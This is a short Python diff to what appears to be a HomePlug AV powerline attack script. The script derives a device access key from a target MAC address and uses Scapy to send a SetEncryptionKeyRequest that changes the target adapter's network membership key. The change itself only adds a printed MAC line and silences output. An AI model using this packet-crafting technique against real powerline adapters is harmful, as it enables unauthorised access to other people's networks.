@@ -39,7 +39,9 @@ if __name__ == "__main__":
                 cmac += x[y]
         newmac = arg + cmac
         keygen = DAKgen(newmac)
+	fmac = ':'.join(newmac[i:i+2] for i in range(0,12,2))
+	print "Sending packet to MAC address: " + fmac
         DAKpass = keygen.generate()
         pbkdf1 = PBKDF1(DAKpass, DAK_SALT, 16, hashlib.sha256())    
         pkt = Ether(src=options.sourcemac)/HomePlugAV()/SetEncryptionKeyRequest(NMK=options.nmk, EKS=1, DAK=binascii.unhexlify(pbkdf1))
-        sendp(pkt, iface=options.iface)
+        sendp(pkt, iface=options.iface,verbose=False)
